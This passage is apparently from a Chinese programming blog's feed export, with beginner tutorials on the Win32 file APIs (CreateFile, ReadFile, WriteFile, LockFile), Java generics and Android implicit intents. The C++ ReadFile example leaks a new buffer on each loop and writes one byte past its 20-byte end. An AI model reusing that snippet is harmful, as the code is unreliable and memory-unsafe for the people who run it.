class="string">"打开失败，看看是不是有杀毒软件哦！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD realRead;</span><br><span class="line">	SetFilePointer(hFile,<span class="number">0</span>, <span class="literal">NULL</span>, FILE_BEGIN); </span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span>* t = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">20</span>];</span><br><span class="line">		<span class="keyword">if</span>( !ReadFile(hFile,t,<span class="number">20</span>,&amp;realRead,<span class="literal">NULL</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"fail"</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		t[realRead] = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;t;</span><br><span class="line">	&#125;<span class="keyword">while</span>(realRead == <span class="number">20</span>);</span><br><span class="line">	 </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>这个地方我们要注意我们的文件属性，要与你的文本属性相同！</strong><br>写文件的话呢其实也很简单：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,                    <span class="comment">// handle to file to write to</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,                <span class="comment">// pointer to data to write to file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToWrite,     <span class="comment">// number of bytes to write</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpNumberOfBytesWritten,  <span class="comment">// pointer to number of bytes written</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPOVERLAPPED lpOverlapped        <span class="comment">// pointer to structure for overlapped I/O</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>参数可以看出基本上是一模一样的，那我们还是看个小例子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	hFile = CreateFile(<span class="string">"Wker.txt"</span>,</span><br><span class="line">					GENERIC_WRITE,<span class="comment">//要写这个文件	</span></span><br><span class="line">					<span class="number">0</span>,<span class="comment">//不共享</span></span><br><span class="line">					<span class="literal">NULL</span>,<span class="comment">//默认的安全属性</span></span><br><span class="line">					OPEN_EXISTING,<span class="comment">//打开文件</span></span><br><span class="line">					FILE_ATTRIBUTE_NORMAL,<span class="comment">//普通文件 </span></span><br><span class="line">					<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"打开失败，看看是不是有杀毒软件哦！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD RealWrite;</span><br><span class="line">	<span class="keyword">char</span> t[<span class="number">4</span>] = <span class="string">"aaa"</span>;</span><br><span class="line">	WriteFile(hFile,t,<span class="number">3</span>,&amp;RealWrite,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(RealWrite != <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"fail:"</span>&lt;&lt;RealWrite;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Write Success"</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但在这个地方我们要注意，我们要写入的自己不需要带最后的00，他好像可以自己加上去。<br>PS：注意了！！！在用这个函数的时候，我们写完的时候，其实内容没有立马改变，而是写在了缓冲区中，Windows会找到合适的时机再写入磁盘的。<br>立即刷新的话呢，我们可以用<code>CloseHandle</code>或者使用比较有针对性的函数：<code>FlushFileBuffers</code>，参数都是一样的，最后一个是专门用来刷新缓冲区数据的。</p>
<h2 id="LockFile与UnlockFile"><a href="#LockFile与UnlockFile" class="headerlink" title="LockFile与UnlockFile"></a><code>LockFile</code>与<code>UnlockFile</code></h2><p>对于文件的安全性，防止文件在写入的过程中内容又被读取我们可以使用这两个函数，主要是对文件的缓冲区进行一定的保护作用，看一下这两个函数的一个定义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加锁</span></span><br><span class="line"><span class="function">BOOL <span class="title">LockFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,           <span class="comment">// handle of file to lock</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetLow,  <span class="comment">// low-order word of lock region offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetHigh,  <span class="comment">// high-order word of lock region offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToLockLow,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="comment">// low-order word of length to lock</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToLockHigh </span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="comment">// high-order word of length to lock</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//解锁</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnlockFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,           <span class="comment">// handle of file to unlock</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetLow,  <span class="comment">// low-order word of lock region offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetHigh,  <span class="comment">// high-order word of lock region offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToUnlockLow,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="comment">// low-order word of length to unlock</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToUnlockHigh </span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="comment">// high-order word of length to unlock</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>参数基本一致那几个High的值很明显就是针对于特大文件的高32位的值，我们用NULL就可以了的，其他参数就是一个文件的加锁开始位置和加锁区域。<br>在这里需要注意的是，虽然我们的加锁文件结束进程的时候会自动解锁，但是这个还是最好显示的调用解锁函数避免我们有的时候文件无法正常的打开，而且Windows解锁文件的时间取决于当前可用的系统内存。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows-CreateFile</title>
    <url>/2020/01/23/Windows-CreateFile/</url>
    <content><![CDATA[<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>这个文件操作呢其实别叫泛，调用函数的类型其实是许多的，但是最强大的那个呢还是要数<code>CreateFile</code>了。来看一下MSDN的介绍吧：<br>The CreateFile function creates or opens the following objects and returns a handle that can be used to access the object: </p>
<ul>
<li>files </li>
<li>pipes </li>
<li>mailslots </li>
<li>communications resources </li>
<li>disk devices (Windows NT only) </li>
<li>consoles </li>
<li>directories (open only) </li>
</ul>
<p>控制台，通信资源，目录（只读打开），磁盘驱动器，文件，邮槽，管道。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpFileName,          <span class="comment">// pointer to name of the file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,       <span class="comment">// access (read-write) mode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwShareMode,           <span class="comment">// share mode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="comment">// pointer to security attributes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCreationDisposition,  <span class="comment">// how to create</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFlagsAndAttributes,  <span class="comment">// file attributes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hTemplateFile         <span class="comment">// handle to file with attributes to </span></span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="comment">// copy</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*下面中文的一个简洁*/</span></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(LPCTSTR lpFileName, <span class="comment">//普通文件名或者设备文件名</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwDesiredAccess, <span class="comment">//访问模式（写/读）</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwShareMode, <span class="comment">//共享模式</span></span></span></span><br><span class="line"><span class="function"><span class="params">	LPSECURITY_ATTRIBUTES lpSecurityAttributes, <span class="comment">//指向安全属性的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwCreationDisposition, <span class="comment">//如何创建</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwFlagsAndAttributes, <span class="comment">//文件属性</span></span></span></span><br><span class="line"><span class="function"><span class="params">	HANDLE hTemplateFile <span class="comment">//用于复制文件句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>其实呢，复杂归复杂，但是有一些东西我们可能很少能用到，比如说按个安全属性，基本上用不到。</p>
<ol>
<li><code>lpFileName</code>这个参数其实就是类似于路径的一个东西，<ul>
<li>文件：文件的名称</li>
<li>串口：COM1为文件名</li>
<li>服务：\.\服务名称（.代表本地机器）</li>
<li>网络上其他主机文件：\主机名\共享目录名\文件名</li>
</ul>
</li>
<li><code>dwDesiredAccess</code>这个就是文件的打开方式<ul>
<li>标准控制权限(16-23位掩码)：</li>
<li>DELETE 删除对象的权限。</li>
<li>READ_CONTROL 从对象的安全描述符中读取信息的权限，但不包括SACL(系统访问控制列表)中的信息。</li>
<li>WRITE_DAC 修改对象安全描述符中的DACL(随机访问控制列表)的权限</li>
<li>WRITE_OWNER 修改对象安全描述符中的属主的权限</li>
<li>SYNCHRONIZE 同步化使用对象的权限，即可以创建一个线程等待信号量释放(但有些对象不支持这个权限)。</li>
<li>STANDARD_RIGHTS_REQUIRED 等价于前面四种权限的总合(通常这四种是必须具有的权限)。</li>
<li>STANDARD_RIGHTS_READ 一般等价于READ_CONTROL</li>
<li>STANDARD_RIGHTS_WRITE 一般等价于READ_CONTROL</li>
<li>STANDARD_RIGHTS_EXECUTE 一般等价于READ_CONTROL</li>
<li>STANDARD_RIGHTS_ALL 等价于前面五种权限的总合。</li>
<li>特殊控制权限(0-15位掩码)：</li>
<li>SPECIFIC_RIGHTS_ALL</li>
<li>ACCESS_SYSTEM_SECURITY</li>
<li>MAXIMUM_ALLOWED</li>
<li>GENERIC_READ</li>
<li>GENERIC_WRITE</li>
<li>GENERIC_EXECUTE</li>
<li>GENERIC_ALL</li>
<li>注：实质上是通过ACCESS_MASK结构体的一个双字值来设置标准权限、特殊权限和一般权限的。</li>
</ul>
</li>
<li><code>dwShareMode</code>这个参数就是共享的方式，百度上的解释：<ul>
<li>如果是零表示不共享； 如果是FILE_SHARE_DELETE表示随后打开操作对象会成功，但只有删除访问请求的权限；如果是FILE_SHARE_READ随后打开操作对象会成功只有请求读访问的权限；如果是FILE_SHARE_WRITE 随后打开操作对象会成功，但只有请求写访问的权限。</li>
</ul>
</li>
<li><code>lpSecurityAttributes</code>这个参数就是一个指向安全属性的一个指针，这个有点乱，我一般就填写NULL，这个就是默认。</li>
<li><code>dwCreationDisposition</code>这个参数文件的状态，主要是下面这几个常量：<ul>
<li>CREATE_NEW 创建文件；如文件存在则会出错</li>
<li>CREATE_ALWAYS 创建文件，会改写前一个文件</li>
<li>OPEN_EXISTING 文件必须已经存在。由设备提出要求</li>
<li>OPEN_ALWAYS 如文件不存在则创建它</li>
<li>TRUNCATE_EXISTING 将现有文件缩短为零长度</li>
</ul>
</li>
<li><code>dwFlagsAndAttributes</code>这个参数新建文件的属性和标志，也就是下面几个常量：<br>FILE_ATTRIBUTE_ARCHIVE 标记归档属性<br>FILE_ATTRIBUTE_COMPRESSED 将文件标记为已压缩，或者标记为文件在目录中的默认压缩方式<ul>
<li>FILE_ATTRIBUTE_NORMAL 默认属性</li>
<li>FILE_ATTRIBUTE_HIDDEN 隐藏文件或目录</li>
<li>FILE_ATTRIBUTE_READONLY 文件为只读</li>
<li>FILE_ATTRIBUTE_SYSTEM 文件为系统文件</li>
<li>FILE_FLAG_WRITE_THROUGH 操作系统不得推迟对文件的写操作</li>
<li>FILE_FLAG_OVERLAPPED 允许对文件进行重叠操作</li>
<li>FILE_FLAG_NO_BUFFERING 禁止对文件进行缓冲处理。文件只能写入磁盘卷的扇区块</li>
<li>FILE_FLAG_RANDOM_ACCESS 针对随机访问对文件缓冲进行优化</li>
<li>FILE_FLAG_SEQUENTIAL_SCAN 针对连续访问对文件缓冲进行优化</li>
<li>FILE_FLAG_DELETE_ON_CLOSE 关闭了上一次打开的句柄后，将文件删除。特别适合临时文件</li>
</ul>
</li>
<li><code>hTemplateFile</code>是个文件的模板，这个参数好像已经废掉了，写个NULL就可以了。</li>
</ol>
<p>返回值的话呢，就是一个文件的句柄，接受之后就可以对其操作了，也不只是文件句柄，很多的东西呢，之后再说。</p>
<h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><p>为了方便起见，我就拿简单的读写文件进行演示吧，其他的都是放在后面说：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	hFile = CreateFile(<span class="string">"Wker.txt"</span>,</span><br><span class="line">					GENERIC_WRITE,<span class="comment">//要写这个文件	</span></span><br><span class="line">					<span class="number">0</span>,<span class="comment">//不共享</span></span><br><span class="line">					<span class="literal">NULL</span>,<span class="comment">//默认的安全属性</span></span><br><span class="line">					CREATE_ALWAYS,<span class="comment">//创建文件</span></span><br><span class="line">					FILE_ATTRIBUTE_NORMAL,<span class="comment">//普通文件 </span></span><br><span class="line">					<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"打开失败，看看是不是有杀毒软件哦！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//操作文件指针 </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码简单易懂，看下就好了。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>java-泛型2</title>
    <url>/2020/01/23/java-%E6%B3%9B%E5%9E%8B2/</url>
    <content><![CDATA[<h2 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h2><p>这个东西相对而言有点小复杂，这里的话呢简单介绍一些比较常用的方式。泛型的方法的话呢其实也就是在一个类中增加一个泛型的方法，看下面的示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">double</span> a = <span class="number">100</span>;</span><br><span class="line">		ceshi tCeshi = <span class="keyword">new</span> ceshi();</span><br><span class="line">		System.out.print(<span class="string">"值:"</span>+tCeshi.&lt;Double&gt;getString(a));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; <span class="function">String <span class="title">getString</span><span class="params">(T a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> a.toString();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，其实那个尖括号里面的类型就是用来定义参数类型的。<br>而且这里，静态方法需要再次声明，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">		ceshi &lt;Integer&gt; tCeshi  = <span class="keyword">new</span> ceshi();</span><br><span class="line">		tCeshi.p(a);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span> &lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> T aT;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">(T a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		System.out.print(a);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就像是这个样子，静态方法需要再次定义。</p>
<h2 id="泛型可变参数方法"><a href="#泛型可变参数方法" class="headerlink" title="泛型可变参数方法"></a>泛型可变参数方法</h2><p>其实大同小异啦，主要还是要说一下是哪个类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">		ceshi &lt;Integer&gt; tCeshi  = <span class="keyword">new</span> ceshi();</span><br><span class="line">		tCeshi.p(a,<span class="number">500</span>,<span class="number">600</span>,<span class="number">900</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span> &lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">(T... a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">			System.out.println(a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="泛型上下边界"><a href="#泛型上下边界" class="headerlink" title="泛型上下边界"></a>泛型上下边界</h2><p>这个东西就是一个定义，其实也不难理解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ceshi &lt;Son&gt; tCeshi  = <span class="keyword">new</span> ceshi();</span><br><span class="line">		tCeshi.p(<span class="number">500</span>,<span class="number">600</span>,<span class="number">900</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span> &lt;<span class="title">T</span> <span class="keyword">extends</span> <span class="title">fa</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">(T... a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">			System.out.println(a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">fa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实仔细看看就是对于我们传入的类型界定一下。</p>
<h2 id="泛型数组"><a href="#泛型数组" class="headerlink" title="泛型数组"></a>泛型数组</h2><p>这个东西有点乱，看了一大顿也不是十分透彻，简单的总结一下。<br>1.不能和创建一个确切的泛型类型数组<br><img src="img1.jpg" alt="错误"><br>可以看到这个样子是不行的，<br>那么我们只能这个样子，使用通配符。<br>但是在最后，取出数据是要做显式的类型转换的。<br>但是我的JDK好像和网上的代码有冲突，这里就不贴图片了。！！！</p>
<p>最近冠状病毒肆虐，希望大家都能够注意健康，也快过年了，希望大家都平平安安的！！！</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Intent Open Activity3</title>
    <url>/2020/01/23/Intent-Open-Activity3/</url>
    <content><![CDATA[<h1 id="隐示Intent"><a href="#隐示Intent" class="headerlink" title="隐示Intent"></a>隐示Intent</h1><p>这个东西是个好东西，主要是用来增加打开方式的，这个和Windows有点区别，windows打开方式的设定是写注册表项，而这个的话呢是来设置我们Activity的一个过滤器就可以达到这个效果，具体看下面操作：</p>
<h2 id="设置AndroidManifest-xml"><a href="#设置AndroidManifest-xml" class="headerlink" title="设置AndroidManifest.xml"></a>设置AndroidManifest.xml</h2><p>首先我们增加一个filter，具体看下面代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".activity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.wker.top"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个首先定义我们的action名称，这个可以自定义，有点类似于一个索引。category的值这里我们限制为这个默认的值，设置好之后，我们加一个按钮事件，通过这个Intent-filter打开这个Activity。</p>
<h2 id="增加打开事件"><a href="#增加打开事件" class="headerlink" title="增加打开事件"></a>增加打开事件</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setAction(<span class="string">"com.wker.top"</span>);</span><br><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
<p>还是先new一个intent，然后设置一下Action的值，然后增加一个category（这里可以看到我们的category是add上去的，所以应该是可以添加多个），然后启动这个intent，这里的效果和我们普通的意图（intent）是一样的，那么我们用这个有什么好处呢？下面我们增加一个新的工程，然后在他的AndroidManifest.xml。</p>
<h2 id="打开方式"><a href="#打开方式" class="headerlink" title="打开方式"></a>打开方式</h2><p>我们将我们上面的intent-filter设置的内容复制到那个activity项目中，例如下面：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:name</span>=<span class="string">".MainActivity"</span></span></span><br><span class="line"><span class="tag">           </span></span><br><span class="line"><span class="tag">           <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> &gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">               <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">intent-filter</span> &gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.wker.top"</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>intent-filter多次设定应该是没啥事情，看来可以设置多个，然后部署到我们的安卓手机上，然后我们再次打开刚才的程序进行测试，你的程序将会看到入下的效果：<br><img src="img1.jpg" alt="打开方式设置"><br>这个就是打开方式的一个设置，也是很简单的，我们随便打开一个，就会跳到那个activity上，具体怎么传送数据，我们之后再讨论。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 泛型</title>
    <url>/2020/01/21/Java-%E6%B3%9B%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="Java泛型"><a href="#Java泛型" class="headerlink" title="Java泛型"></a>Java泛型</h1><p>官方解释：</p>
<ol>
<li>第一是泛化。可以用T代表任意类型Java语言中引入泛型是一个较大的功能增强不仅语言、类型系统和编译器有了较大的变化，以支持泛型，而且类库也进行了大翻修，所以许多重要的类，比如集合框架，都已经成为泛型化的了，这带来了很多好处。</li>
<li>第二是类型安全。泛型的一个主要目标就是提高ava程序的类型安全，使用泛型可以使编译器知道变量的类型限制，进而可以在更高程度上验证类型假设。如果不用泛型，则必须使用强制类型转换，而强制类型转换不安全，在运行期可能发生ClassCast Exception异常，如果使用泛型，则会在编译期就能发现该错误。</li>
<li>第三是消除强制类型转换。泛型可以消除源代码中的许多强制类型转换，这样可以使代码更加可读，并减少出错的机会。</li>
<li>第四是向后兼容。支持泛型的Java编译器（例如JDK1.5中的Javac）可以用来编译经过泛型扩充的Java程序（Generics Java程序），但是现有的没有使用泛型扩充的Java程序仍然可以用这些编译器来编译。</li>
</ol>
<p>这个东西感觉上有点类似于C++的模板和<code>static_cast</code>这种静态转换，从其他的地方借鉴来的一些知识（部分知识来自于博客：<a href="https://blog.csdn.net/s10461/article/details/53941091" target="_blank" rel="noopener" title="Java泛型">https://blog.csdn.net/s10461/article/details/53941091</a>）</p>
